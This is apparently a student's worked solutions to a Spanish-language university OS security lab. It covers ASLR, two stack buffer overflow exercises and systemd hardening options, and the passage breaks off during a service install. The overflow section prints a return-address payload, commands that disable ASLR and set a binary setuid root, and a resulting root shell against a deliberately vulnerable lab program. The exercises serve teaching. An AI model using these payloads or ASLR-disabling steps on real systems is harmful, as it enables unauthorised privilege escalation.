<h1 align="center">Práctica 5</h1>

## Seguridad I

### Notas:

### Utilizar un kernel completo (no el compilado en las prácticas 1 y 2).

### Compilar el código C usando el Makefile provisto a fin de deshabilitar algunas medidas de seguridad del compilador y generar un código assembler más simple.

### Acceda al código necesario para la práctica en el repositorio de la materia.

### A - Introducción

#### 1. Defina política y mecanismo.

- Una **política** define qué se permite y qué no: reglas de seguridad.
- Un **mecanismo** define cómo se implementa y se hace cumplir cada regla de seguridad. Son las aplicaciones de las políticas.

#### 2. Defina objeto, dominio y right.

- Un **objeto** es lo que se quiere proteger. Puede ser de hardware o software. Cada objeto tiene un ID.
- Un **dominio** es un conjunto de pares (objeto, derecho). Cada par especifica un objeto y un conjunto de operaciones que se pueden realizar con él.
- Un **derecho** implica autorización para efectuar esas operaciones.

#### 3. Defina POLA (Principle of least authority).

El POLA (Principle Of Least Authority) dice que cada componente (usuario, proceso, programa) debe tener **solo los privilegios mínimos necesarios para realizar su tarea**.

En otras palabras, define que los procesos accedan sólo a los objetos que necesitan (con los derechos que necesiten) para completar su tarea.

Este principio es fundamental por varias razones:

- **Reduce riesgos**: menos privilegios = menos daño si hay un fallo o una intrusión.
- **Limita el impacto de errores o ataques**: un proceso comprometido no puede afectar más de lo necesario.
- **Mejora la seguridad global del sistema**.

#### 4. ¿Qué valores definen el dominio en UNIX?

En Unix el dominio está definido por el UID y el GID:

- Dado un par **(UID, GID)** hay un conjunto de objetos a los cuales se puede acceder con ciertos permisos.
- Dos procesos con igual **(UID, GID)** pertenecen al mismo dominio, y por ende pueden acceder al mismo conjunto de archivos.

#### 5. ¿Qué es ASLR (Address Space Layout Randomization)? ¿Linux provee ASLR para los procesos de usuario? ¿Y para el kernel?

ASLR es una técnica de seguridad informática que busca prevenir la explotación de vulnerabilidades de corrupción de memoria, como los buffer overflows.

ASLR funciona aleatorizando las posiciones en la memoria de áreas clave de un programa, incluyendo:

- **La base del ejecutable**: La dirección donde comienza el código del programa.
- **La pila**: Donde se almacenan las variables locales y las llamadas a funciones.
- **La heap**: La memoria dinámica que el programa solicita durante su ejecución.
- **Las librerías compartidas**: Archivos de código reutilizable que los programas cargan en tiempo de ejecución (ej. libc).

Al hacer que estas direcciones de memoria sean diferentes en cada ejecución, ASLR dificulta que un atacante pueda predecir dónde se encuentran los datos o el código que necesita para ejecutar un ataque. Si un atacante intenta saltar a una dirección de memoria fija, es muy probable que el programa falle en lugar de ejecutar el código malicioso, ya que la dirección habrá cambiado.

Linux provee ASLR para los procesos de usuario vía el archivo `/proc/sys/kernel/randomize_va_space`.

**Para que la aleatorización sea efectiva, los programas también deben estar compilados como "Position Independent Executables" (PIE).**

Linux también provee ASLR para el kernel, conocido como KASLR.

El objetivo de KASLR es el mismo que el de ASLR para el espacio de usuario: aleatorizar las ubicaciones de los componentes del kernel en la memoria para dificultar los ataques que intentan explotar vulnerabilidades en el propio kernel. Cuando KASLR está habilitado, el kernel carga sus propios códigos y datos en direcciones aleatorias en cada arranque del sistema.

**Para que KASLR funcione, el kernel de Linux debe estar compilado con la opción CONFIG_RANDOMIZE_BASE habilitada.**

#### 6. ¿Cómo se activa/desactiva ASLR para todos los procesos de usuario en Linux?

El ASLR se puede configurar para todos los procesos de usuario a través del archivo `/proc/sys/kernel/randomize_va_space`. Los valores posibles son:

- **0**: No hay aleatorización. Todas las direcciones de memoria son estáticas.
- **1**: Aleatorización conservadora. Las librerías compartidas, la pila, `mmap()` y la página VDSO se aleatorizan.
- **2**: Aleatorización completa. Además de lo anterior, la memoria gestionada a través de `brk()` también se aleatoriza. Este suele ser el valor por defecto en los kernel Linux modernos.

### B - Ejercicio introductorio: Buffer Overflow simple

#### El propósito de este ejercicio es que las y los estudiantes tengan una introducción simple a un stack buffer overflow a fin de poder abordar el siguiente ejercicio. Las y los estudiantes aprenderán a identificar la vulnerabilidad, analizar la disposición de la memoria y construir una entrada que aproveche la vulnerabilidad para obtener acceso no autorizado a una función privilegiada.

#### Nota: Puede ser de ayuda ver el código assembler generado al compilar (`00-stack-overflow.s`) o utilizar `gdb` para depurar el programa pero no es obligatorio.

#### Tip del profe sobre el payload para `01-stack-overflow-ret`: "En la explicación vieron que probé un payload bastante grande (128 bytes de relleno antes del puntero) y no funcionó, bueno el payload en realidad es mucho más chico, el enunciado de la práctica los guía para que lo puedan calcular sin usar el debugger."

#### 1. Usando el makefile provisto, compilar el ejemplo `00-stack-overflow.c` provisto en el repositorio de la cátedra.

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Desktop/Downloads/codigo-para-practicas/practica5$ make
cc -save-temps -g -fno-stack-protector -z execstack -no-pie -fcf-protection=none -O0    00-stack-overflow.c   -o 00-stack-overflow
00-stack-overflow.c: In function ‘login’:
00-stack-overflow.c:19:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   19 |     gets(password);             // Vulnerable function reads without bounds
      |     ^~~~
      |     fgets
/usr/bin/ld: 00-stack-overflow.o: in function `login':
/home/juan/Desktop/Downloads/codigo-para-practicas/practica5/00-stack-overflow.c:19:(.text+0x6d): warning: the `gets' function is dangerous and should not be used.
cc -save-temps -g -fno-stack-protector -z execstack -no-pie -fcf-protection=none -O0    01-stack-overflow-ret.c   -o 01-stack-overflow-ret
/usr/bin/ld: 01-stack-overflow-ret.o: in function `login':
/home/juan/Desktop/Downloads/codigo-para-practicas/practica5/01-stack-overflow-ret.c:33:(.text+0x11a): warning: the `gets' function is dangerous and should not be used.
```

#### 2. Ejecutar el programa y observar las direcciones de las variables access y password, así como la distancia entre ellas.

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Desktop/Downloads/codigo-para-practicas/practica5$ ./00-stack-overflow
access pointer: 0x7ffcd6b9faff, password pointer: 0x7ffcd6b9fae0, distance: 31
Write password:
```

Las direcciones son:

- **access**: 0x7ffcd6b9faff
- **password**: 0x7ffcd6b9fae0

La distancia entre ellas es de 0x1F o 31 en decimal.

#### 3. Probar el programa con una password cualquiera y con "big secret" para verificar que funciona correctamente.

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Desktop/Downloads/codigo-para-practicas/practica5$ ./00-stack-overflow
access pointer: 0x7ffd7ade81cf, password pointer: 0x7ffd7ade81b0, distance: 31
Write password: abc
Access denied
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Desktop/Downloads/codigo-para-practicas/practica5$ ./00-stack-overflow
access pointer: 0x7ffd7e16a76f, password pointer: 0x7ffd7e16a750, distance: 31
Write password: big secret
Now you know the secret
```

#### 4. Volver a ejecutar pero ingresar una password lo suficientemente larga para sobreescribir access. Usar distance como referencia para establecer la longitud de la password.

Probando con password de 31 caracteres: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Desktop/Downloads/codigo-para-practicas/practica5$ ./00-stack-overflow
access pointer: 0x7ffd44f4fc6f, password pointer: 0x7ffd44f4fc50, distance: 31
Write password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Access denied
```

Probando con password de 32 caracteres: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Desktop/Downloads/codigo-para-practicas/practica5$ ./00-stack-overflow
access pointer: 0x7ffc8921f0cf, password pointer: 0x7ffc8921f0b0, distance: 31
Write password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Now you know the secret
```

Explicación del problema:

```c
int login() {
    int8_t access = 0;
    char password[16];
    printf("access pointer: %p, password pointer: %p, distance: %lu\n",
           &access, password, (char *) &access - password);
    printf("Write password: ");
    gets(password);             // Vulnerable function reads without bounds
    if (strcmp(password, "big secret") == 0) {
        access = 1;
    }
    return access;
}
```

- La función devuelve 1 si la contraseña es correcta o 0 si es incorrecta.
- Inicialmente, la variable flag que indica si la contraseña es correcta o no se inicializa en 0, es decir incorrecta.
- La variable access ocupa un solo byte.
- La variable password ocupa 16 bytes.
- Sin embargo la diferencia es 31. Esto significa que el compilador está agregando relleno (padding) entre variables para alinearlas correctamente.
- Gráficamente:

```
+---------------------+  ← Dirección más baja (top del stack)
| password[0]         |  ← Comienzo del buffer (16 bytes)
| password[1]         |
| ...                 |
| password[15]        |
+---------------------+
| padding (relleno)   |  ← Espacio extra por alineación (15 bytes)
+---------------------+
| access (1 byte)     |  ← Variable que controla el acceso (0 = denegado)
+---------------------+  ← Dirección más alta (bottom del stack)
```

- La función `gets()` lee entrada del usuario, pero es extremadamente peligrosa debido a su comportamiento no seguro.
- Cuando escribo las 32 'a's:

```
+---------------------+
| 'a' (password[0])   |  ← 1er byte
| 'a' (password[1])   |
| ...                 |
| 'a' (password[15])  |  ← Byte 16 (fin del buffer)
+---------------------+
| 'a' (padding[0])    |  ← Byte 17 (empieza a sobrescribir el padding)
| ...                 |
| 'a' (padding[14])   |  ← Byte 31
+---------------------+
| 'a' (access)        |  ← Byte 32: Sobrescribe `access` con 'a' (0x41)
+---------------------+
```

- Originalmente, access = 0 (acceso denegado).
- Al escribir 32 bytes, el último byte ('a' = 0x61) sobrescribe access.
- El if da falso, por lo cual no sobreescribe access con 1, pero no importa, porque el overflow ya sobreescribió access con 0x61 que es distinto de 0.
- Entonces, en la función `main()`, `if (login())` da verdadero, porque en C cualquier valor distinto de 0 es "verdadero".

**Nota**: El valor 0x61 ('a') es arbitrario. Cualquier byte ≠ 0 en la posición 32 haría el overflow.

#### 5. Después de realizar la explotación, reflexiona sobre las siguientes preguntas:

##### a. ¿Por qué el uso de `gets()` es peligroso?

El uso de `gets()` es peligroso porque:

- No verifica el tamaño del buffer donde almacena los datos.
- Si el usuario escribe más caracteres de los que caben en el buffer, `gets()` seguirá escribiendo más allá del espacio asignado, sobrescribiendo otras partes de la memoria (como otras variables, direcciones de retorno, etc.).

##### b. ¿Cómo se puede prevenir este tipo de vulnerabilidad?

Este tipo de vulnerabilidad se puede prevenir de varias formas:

- Usando funciones seguras como `fgets()` en vez de `gets()`.
- Validando la longitud de las entradas del usuario.
- Usando protecciones del compilador.
- Usando ASLR.

##### c. ¿Qué medidas de seguridad ofrecen los compiladores modernos para evitar estas vulnerabilidades?

Los compiladores modernos ofrecen varias medidas de seguridad para evitar el buffer overflow:

- **Stack Canaries**:

  - Inserta un valor secreto ("canario") antes del return address.
  - Si se modifica (por overflow), el programa se cierra.
  - Flag: `-fstack-protector-strong`

- **ASLR**:

  - Aleatoriza direcciones de memoria (stack, librerías).
  - Activación: `echo 2 > /proc/sys/kernel/randomize_va_space`

- **NX Bit**:

  - Hace el stack no-ejecutable (evita ejecutar shellcode).
  - Flag: `-z noexecstack`

- **Fortify Source**:

  - Reemplaza funciones inseguras (strcpy, gets) con versiones que verifican límites.
  - Flag: `-D_FORTIFY_SOURCE=2`

- **RELRO**:
  - Protege tablas de enlazado dinámico.
  - Flag: `-z now` (Full RELRO)

### C - Ejercicio: Buffer Overflow reemplazando dirección de retorno

#### Objetivo: El objetivo de este ejercicio es que las y los estudiantes comprendan cómo una vulnerabilidad de desbordamiento de búfer puede ser explotada para alterar la dirección de retorno de una función, redirigiendo la ejecución del programa a una función privilegiada. Además, se explorará el mecanismo de seguridad ASLR y cómo desactivarlo temporalmente para facilitar la explotación.

#### Nota: Puede ser de ayuda ver el código assembler generado al compilar (`01-stack-overflow-ret.s`) o utilizar `gdb` para depurar el programa pero no es obligatorio.

#### 1. Usando el makefile provisto, compilar el ejemplo `01-stack-overflow-ret.c` provisto en el repositorio de la cátedra.

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ make
cc -save-temps -g -fno-stack-protector -z execstack -no-pie -fcf-protection=none -O0    00-stack-overflow.c   -o 00-stack-overflow
00-stack-overflow.c: In function ‘login’:
00-stack-overflow.c:19:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   19 |     gets(password);             // Vulnerable function reads without bounds
      |     ^~~~
      |     fgets
/usr/bin/ld: 00-stack-overflow.o: in function `login':
/home/juan/Downloads/codigo-para-practicas/practica5/00-stack-overflow.c:19:(.text+0x6d): warning: the `gets' function is dangerous and should not be used.
cc -save-temps -g -fno-stack-protector -z execstack -no-pie -fcf-protection=none -O0    01-stack-overflow-ret.c   -o 01-stack-overflow-ret
/usr/bin/ld: 01-stack-overflow-ret.o: in function `login':
/home/juan/Downloads/codigo-para-practicas/practica5/01-stack-overflow-ret.c:33:(.text+0x11a): warning: the `gets' function is dangerous and should not be used.
```

#### 2. Configurar `setuid` en el programa para que al ejecutarlo, se ejecute como usuario root.

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ sudo chown root:root 01-stack-overflow-ret
[sudo] password for juan:
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ sudo chmod u+s 01-stack-overflow-ret
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ ls -l 01-stack-overflow-ret
-rwsrwxr-x 1 root root 18472 May 31 18:54 01-stack-overflow-ret
```

#### 3. Verificar si tiene ASLR activado en el sistema. Si no está, actívelo.

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ cat /proc/sys/kernel/randomize_va_space
2
```

Esto indica que tengo activado el ASLR en modo **aleatorización completa**.

#### 4. Ejecute `01-stack-overflow-ret` al menos 2 veces para verificar que la dirección de memoria de `privileged_fn()` cambia.

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ ./01-stack-overflow-ret
privileged_fn: 0x4011b6
Write password: a
Access denied
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ ./01-stack-overflow-ret
privileged_fn: 0x4011b6
Write password: a
Access denied
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ ./01-stack-overflow-ret
privileged_fn: 0x4011b6
Write password: a
Access denied
```

La dirección no cambia, a pesar de que tengo ASLR activado. Esto se debe a que el Makefile está compilando los programas con la flag `-no-pie`. Entonces, modifico el Makefile para que active esta característica, usando `-fPIE -pie`.

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ ./01-stack-overflow-ret
privileged_fn: 0x57b7cd84e1c9
Write password: a
Access denied
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ ./01-stack-overflow-ret
privileged_fn: 0x5e8906a681c9
Write password: a
Access denied
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ ./01-stack-overflow-ret
privileged_fn: 0x5eaa470201c9
Write password: a
Access denied
```

Ahora las direcciones están correctamente randomizadas.

#### 5. Apague ASLR y repita el punto 4 para verificar que esta vez el proceso siempre retorna la misma dirección de memoria para `privileged_fn()`.

```sh
root@juan-Lenovo-IdeaPad-S145-15AST:/home/juan/Downloads/codigo-para-practicas/practica5# echo 0 > /proc/sys/kernel/randomize_va_space
root@juan-Lenovo-IdeaPad-S145-15AST:/home/juan/Downloads/codigo-para-practicas/practica5# cat /proc/sys/kernel/randomize_va_space
0
root@juan-Lenovo-IdeaPad-S145-15AST:/home/juan/Downloads/codigo-para-practicas/practica5# ./01-stack-overflow-ret
privileged_fn: 0x5555555551c9
Write password: a
Access denied
root@juan-Lenovo-IdeaPad-S145-15AST:/home/juan/Downloads/codigo-para-practicas/practica5# ./01-stack-overflow-ret
privileged_fn: 0x5555555551c9
Write password: a
Access denied
root@juan-Lenovo-IdeaPad-S145-15AST:/home/juan/Downloads/codigo-para-practicas/practica5# ./01-stack-overflow-ret
privileged_fn: 0x5555555551c9
Write password: a
Access denied
```

Ahora el proceso siempre retorna la misma dirección.

#### 6. Suponiendo que el compilador no agregó ningún padding en el stack tenemos los siguientes datos:

##### a. El stack crece hacia abajo.

##### b. Si estamos compilando en x86_64 los punteros ocupan 8 bytes.

##### c. x86_64 es little endian.

##### d. Primero se apiló la dirección de retorno (una dirección dentro de la función `main()`). Ocupa 8 bytes.

##### e. Luego se apiló la vieja base de la pila (`rbp`). Ocupa 8 bytes.

##### f. password ocupa 16 bytes.

##### Calcule cuántos bytes de relleno necesita para pisar la dirección de retorno.

- En la arquitectura x86_64, el stack tiene dos características fundamentales:
  - **Crece hacia abajo**: La pila crece desde direcciones de memoria más altas hacia direcciones de memoria más bajas. Esto significa que cuando se hace un `push` de un valor, el puntero de la pila (RSP o Register Stack Pointer) se **decrementa** y el dato se almacena en esa nueva dirección más baja. Cuando se hace un pop de un valor, el puntero de la pila se **incrementa**.
  - **Little Endian**: x86_64 es una arquitectura little-endian. Esto se refiere a cómo se almacenan los bytes de un valor multibyte en la memoria. En un sistema little-endian, **el byte menos significativo de un valor se almacena en la dirección de memoria más baja, y el byte más significativo se almacena en la dirección de memoria más alta**.
- Cuando se llama a la función `login()`, el stack se organiza de la siguiente manera:

```
+---------------------------------+
| Contenido del stack             |
+---------------------------------+
| Argumentos de la función        |
+---------------------------------+
| Dirección de retorno            |
+---------------------------------+
| RBP (Register Base Pointer)     |
+---------------------------------+
| Variables locales de login()    |
+---------------------------------+
```

- Entonces, para pisar la dirección de retorno, se requieren:
  - 16 bytes para rellenar `password`.
  - 8 bytes para pisar RBP.
  - Los próximos 8 bytes son donde tenemos que escribir la dirección de la función a la que queremos saltar (`privileged_fn()`) la cual es 0x5555555551c9.
  - Por ende necesitamos **24 bytes** de padding.

#### 7. Ejecute el script `payload_pointer.py` para generar el payload. La ayuda se puede ver con:

```sh
python payload_pointer.py --help
```

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ python3 payload_pointer.py --pointer-size 8 --endianness little --padding 24 --pointer 0x5555555551c9
0123456789abcdefghijklmn�QUUUU
```

#### 8. Pruebe el payload redirigiendo la salida del script a `01-stack-overflow-ret` usando un pipe.

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ (python3 payload_pointer.py --pointer-size 8 --endianness little --padding 24 --pointer 0x5555555551c9) | ./01-stack-overflow-ret
privileged_fn: 0x5555555551c9
Write password: uid = 1000, euid = 1000
Failed to set UID to root: Operation not permitted
Don't forget to set the owner and the SUID bit on this file:
        chown root ./01-stack-overflow-ret
        chmod u+s ./01-stack-overflow-ret
```

#### 9. Para poder interactuar con el shell invoque el programa usando el argumento `--program` del script `payload_pointer`. Por ejemplo:

```sh
python payload_pointer.py --padding <padding> --pointer <pointer> --program ./01-stack-overflow-ret
```

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ python3 payload_pointer.py --pointer-size 8 --endianness little --padding 24 --pointer 0x5555555551c9 --program ./01-stack-overflow-ret
You will not see the prompt but try some commands like ls, id, pwd, etc.
privileged_fn: 0x5555555551c9
Write password: uid = 1000, euid = 1000
Don't forget to set the owner and the SUID bit on this file:
        chown root ./01-stack-overflow-ret
        chmod u+s ./01-stack-overflow-ret
```

```sh
root@juan-Lenovo-IdeaPad-S145-15AST:/home/juan/Downloads/codigo-para-practicas/practica5# chown root ./01-stack-overflow-ret
root@juan-Lenovo-IdeaPad-S145-15AST:/home/juan/Downloads/codigo-para-practicas/practica5# chmod u+s ./01-stack-overflow-ret
```

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ python3 payload_pointer.py --pointer-size 8 --endianness little --padding 24 --pointer 0x5555555551c9 --program ./01-stack-overflow-ret
You will not see the prompt but try some commands like ls, id, pwd, etc.
```

#### 10. Pruebe algunos comandos para verificar que realmente tiene acceso a un shell con UID 0.

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ python3 payload_pointer.py --pointer-size 8 --endianness little --padding 24 --pointer 0x5555555551c9 --program ./01-stack-overflow-ret
You will not see the prompt but try some commands like ls, id, pwd, etc.
id
uid=0(root) gid=1000(juan) groups=1000(juan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),105(lpadmin),124(sambashare),986(docker)
whoami
root
ls -l /root
total 0
```

Se puede ver claramente que tenemos privilegios de root.

#### 11. Conteste:

##### a. ¿Qué efecto tiene setear el bit setuid en un programa si el propietario del archivo es `root`? ¿Qué efecto tiene si el usuario es por ejemplo `nobody`?

El bit `setuid` es un permiso especial en Linux que se aplica a archivos ejecutables. Cuando se activa en un archivo ejecutable, permite que el programa se ejecute con los privilegios del propietario del archivo, en lugar de los privilegios del usuario que lo ejecuta.

Si el propietario del archivo es `root`, cuando un usuario (incluso uno sin privilegios) ejecuta el programa con el bit setuid activado, el proceso se ejecutará con permisos de root.

Si el propietario del archivo es `` nobody`, el programa se ejecutará con los permisos de  ``nobody`` (un usuario de bajos privilegios típico). Esto es útil para restringir los permisos de un programa, incluso si lo ejecuta un usuario con más privilegios (por ejemplo, un servicio que no deba acceder a archivos sensibles).

##### b. Compare el resultado del siguiente comando con la dirección de memoria de `privileged_fn()`. ¿Qué puede notar respecto a los octetos? ¿A qué se debe esto?

```sh
python payload_pointer.py --padding <padding> --pointer <pointer> | hd
```

```sh
juan@juan-Lenovo-IdeaPad-S145-15AST:~/Downloads/codigo-para-practicas/practica5$ python3 payload_pointer.py --padding 24 --pointer 0x5555555551c9 | hd
00000000  30 31 32 33 34 35 36 37  38 39 61 62 63 64 65 66  |0123456789abcdef|
00000010  67 68 69 6a 6b 6c 6d 6e  c9 51 55 55 55 55 00 00  |ghijklmn.QUUUU..|
00000020  0a 0a                                             |..|
00000022
```

Puedo notar que se lee de derecha a izquierda por ser Little Endian. Además, noto que termina con 0a, que es el caracter de salto de línea. Esto le dice a la función `gets()` que deje de leer datos.

##### c. ¿Cómo ASLR ayuda a evitar este tipo de ataques en un escenario real donde el programa no imprime en pantalla el puntero de la función objetivo?

ASLR ayuda porque no hay forma de saber la dirección donde la función objetivo se alojará, y tampoco hay forma de saber cuantos bytes se necesitan para pisar la dirección de retorno.

##### d. ¿Cómo podría evitar este tipo de ataques en un módulo del kernel de Linux? ¿Qué mecanismo debería estar habilitado?

En un módulo del Kernel, se usa KASLR, la versión de ASLR específica para el Kernel. Esta versión aleatoriza la base de carga del propio kernel y sus módulos en la memoria virtual en cada arranque del sistema.

Por ende debería estar habilitado KASLR.

### D - Ejercicio SystemD

#### Objetivo: Aprender algunas restricciones de seguridad que se pueden aplicar a un servicio en SystemD.

#### https://www.redhat.com/en/blog/cgroups-part-four

#### https://www.redhat.com/en/blog/mastering-systemd

#### 1. Investigue los comandos:

##### a. `systemctl enable`

- Habilita una unidad (servicio, socket, etc.) de systemd.
- Cuando una unidad se habilita, systemd crea un enlace simbólico desde el directorio de configuración del sistema (por ejemplo, `/etc/systemd/system/multi-user.target.wants/`) al archivo de unidad real (por ejemplo, `/usr/lib/systemd/system/nombre_servicio.service`).
- Esto asegura que la unidad se inicie automáticamente en cada arranque del sistema, o cuando se cumplan las condiciones para su activación (en el caso de sockets o temporizadores).
- Se usa principalmente para habilitar servicios que deben ejecutarse siempre.

##### b. `systemctl disable`

- Deshabilita una unidad, lo que significa que se elimina el enlace simbólico creado anteriormente.
- Al deshabilitar una unidad, se evita que se inicie automáticamente en los futuros arranques del sistema o que se active bajo las condiciones previamente configuradas.
- Se usa principalmente para deshabilitar servicios que ya no es necesario que se inicien automáticamente.

##### c. `systemctl daemon-reload`

- Le indica a systemd que recargue su configuración.
- Es necesario ejecutarlo después de realizar cambios manuales en los archivos de unidad (por ejemplo, crear un nuevo archivo .service o modificar uno existente) para que systemd detecte y aplique esos cambios.
- No es necesario ejecutar este comando luego de usar `systemctl enable` o `systemctl disable` porque esos comandos ya actualizan la configuración de systemd de forma interna.

##### d. `systemctl start`

- Inicia una unidad inmediatamente.
- Si la unidad es un servicio, lo ejecuta.
- Si es un socket, lo activa.

##### e. `systemctl stop`

- Detiene una unidad que se está ejecutando.
- Si es un servicio, lo termina.

##### f. `systemctl status`

- Muestra el estado actual de una unidad.
- Proporciona información valiosa como si la unidad está activa o inactiva, si está habilitada o deshabilitada, su PID, su uso de memoria, las últimas líneas de su registro y los procesos asociados.
- Se suele usar para verificar el estado de un servicio, diagnosticar problemas o simplemente obtener información sobre una unidad.

##### g. `systemd-cgls`

- Muestra la jerarquía de **cgroups** administrados por systemd.
- systemd utiliza cgroups para gestionar y aislar los servicios y procesos, lo que facilita el control de recursos y la contabilidad.
- Se suele usar para entender cómo systemd organiza los procesos, diagnosticar problemas de rendimiento o ver cuáles servicios están consumiendo más recursos.

##### h. `journalctl -u [unit]`

- Muestra los registros (logs) de una unidad específica.
- `journalctl` es la utilidad de línea de comandos para consultar el Systemd Journal, que es el sistema de registro centralizado de systemd. Permite filtrar los registros por unidad, por tiempo, por prioridad, etc.

#### 2. Investigue las siguientes opciones que se pueden configurar en una unit service de `systemd`:

##### a. IPAddressDeny e IPAddressAllow

- Controlan el acceso a la red de los procesos asociados a esa unidad.
- Definen reglas de filtrado de direcciones IP para el tráfico de red de la unidad. Esto se hace a nivel del kernel de Linux, utilizando los cgroups y las capacidades de filtrado de IP.
- **IPAddressAllow=**: Si la dirección IP que se está verificando coincide con una entrada en la lista IPAddressAllow=, se permite el acceso.
- **IPAddressDeny=**: Si la dirección IP que se está verificando coincide con una entrada en la lista IPAddressDeny=, se deniega el acceso.
- Si la dirección IP no coincide con ninguna de las reglas anteriores, se permite el acceso.

##### b. User y Group

- Se usan para especificar bajo qué usuario y grupo se ejecutará el proceso principal del servicio.
- **User=**: Define el usuario que ejecutará el servicio. Esto es crucial para la seguridad, ya que el servicio operará con los privilegios de ese usuario, no como root (a menos que se especifique root).
- **Group=**: Define el grupo principal bajo el cual se ejecutará el servicio, controlando sus permisos de acceso a archivos y recursos del sistema basados en la pertenencia a ese grupo.

##### c. ProtectHome

- Restringe el acceso de un servicio a los directorios de usuario.
- **ProtectHome=yes (o true)**: Hace que los directorios `/home`, `/root` y `/run/user/` aparezcan vacíos e inaccesibles para el servicio. Es la opción más restrictiva y es ideal para servicios que no tienen ningún motivo para interactuar con datos de usuario.
- **ProtectHome=read-only**: Hace que los directorios `/home`, `/root` y `/run/user/` sean de solo lectura para el servicio.
- **ProtectHome=tmpfs**: Monta un sistema de archivos temporal (tmpfs) sobre `/home`, `/root` y `/run/user/`. Esto también los hace aparecer vacíos, pero cualquier escritura que el servicio intente hacer en estas ubicaciones se realizará en una memoria volátil y no afectará los directorios reales. Es útil para servicios que necesitan un espacio de trabajo temporal dentro de lo que sería el "home", pero que no deben tener acceso persistente.
- **ProtectHome=no (o false)**: Es el valor por defecto y significa que no se aplica ninguna restricción de ningún tipo a los directorios de usuario.

##### d. PrivateTmp

- Su propósito es aislar los directorios temporales del servicio del resto del sistema.
- **PrivateTmp=true**: Systemd monta un nuevo sistema de archivos temporal (tmpfs) dedicado y vacío sobre los directorios `/tmp` y `/var/tmp` específicamente para ese servicio. El servicio no puede ver ni acceder a los archivos que otros procesos o servicios hayan creado en los directorios `/tmp` o `/var/tmp` del sistema principal. De igual manera, los archivos que el servicio cree en sus `/tmp` o `/var/tmp` privados no serán visibles para otros procesos. Cuando el servicio se detiene, los directorios temporales privados y todo su contenido se borran automáticamente.

##### e. ProtectProc

- Limita la información visible en el sistema de archivos `/proc` para el servicio y sus procesos hijos.
- Controla cuánto puede "ver" un servicio sobre otros procesos que se están ejecutando en el sistema, o incluso sobre sí mismo.
- Puede tomar varios valores, cada uno con un nivel diferente de restricción:
  - **default**: No aplica ninguna restricción. El servicio tiene acceso normal a `/proc`.
  - **invisible**: Oculta la información de los procesos que pertenecen a otros usuarios. Es decir, el servicio solo verá sus propios procesos y los procesos del mismo usuario.
  - **noaccess**: Restringe completamente el acceso a `/proc` (excepto por la información esencial sobre el propio proceso). El servicio no podrá ver información sobre ningún otro proceso, ni siquiera de los que le pertenecen al mismo usuario.
  - **ptraceable**: Oculta todos los procesos a menos que la función `ptrace()` esté permitida en un proceso específico.

##### f. MemoryAccounting, MemoryHigh y MemoryMax

- Se relacionan con la gestión y el control del uso de la memoria para un servicio, usando las capacidades de cgroups.
- **MemoryAccounting=**: Habilita el seguimiento y la contabilidad del uso de memoria del servicio. Debe ser true para que MemoryHigh y MemoryMax funcionen.
- **MemoryHigh=**: Establece un límite "suave" de memoria. El kernel intentará que el servicio libere memoria si supera el límite, pero no lo terminará. Actúa como una señal para que el servicio reduzca su consumo.
- **MemoryMax=**: Establece un límite "duro" y absoluto de memoria. Si el servicio alcanza este límite, el kernel lo matará para evitar que consuma toda la RAM del sistema.

#### 3. Tenga en cuenta para los siguientes puntos:

##### a. La configuración del servicio se instala en: `/etc/systemd/system/insecure_service.service`

##### b. Cada vez que modifique la configuración será necesario recargar el demonio de systemd y recargar el servicio:

###### i. `systemctl daemon-reload`

###### ii. `systemctl restart insecure_service.service`

#### 4. En el directorio insecure_service del repositorio de la cátedra encontrará el binario `insecure_service`, el archivo de configuración `insecure_service.service` y el script `install.sh`.

##### a. Instale el servicio usando el script `install.sh`.

```sh
so@so:~/codigo-para-practicas/practica5/insecure_service$ su -c ./install.sh
Contraseña:
Instalando el servicio de practica5
Failed to disable unit: Unit file insecure_service.service does not exist.
Failed to kill unit insecure_service.service: Unit insecure_service.service not loaded.
pkill: pattern that searches for process name longer than 15 characters will result in zero matches
Try `pkill -f' option to match against the complete command line.
Created symlink /etc/systemd/system/multi-user.target.wants/insecure_service.service → /etc/systemd/system/insecure_service.service.
Servicio instalado y arrancado
Para ver el estado del servicio:
        systemctl status insecure_service.service
Para ver los logs del servicio:
